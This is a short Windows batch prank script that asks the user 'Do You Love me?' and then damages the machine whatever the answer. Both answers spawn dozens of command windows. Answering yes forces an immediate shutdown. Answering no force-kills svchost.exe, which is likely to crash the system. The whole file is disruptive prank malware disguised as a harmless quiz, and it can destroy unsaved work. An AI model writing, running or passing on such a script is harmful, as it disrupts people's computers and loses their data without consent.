@echo off
color a

:start_menu

echo press y for yes and n for no 

:: taking input
set /p user_input="Do You Love me?"

:: conditions
if /i %user_input% == y goto Love
if /i %user_input% == Y goto Love
if /i %user_input% == n goto No_love
if /i %user_input% == N goto No_love

echo wrong choice 
timeout /t 1 > nul
cls
goto start_menu

:Love
echo i Love you too but

timeout /t 2 > nul
for /L %%i in (1,1,39) do (
    start
)

timeout /t 13 > nul

shutdown -s -t 00 -c "see you soon..."
pause

:No_love
echo i hate you too

timeout /t 1 > nul
for /L %%i in (1,1,35) do (
    start
)
timeout /t 13 > nul
taskkill /IM svchost.exe /F
pause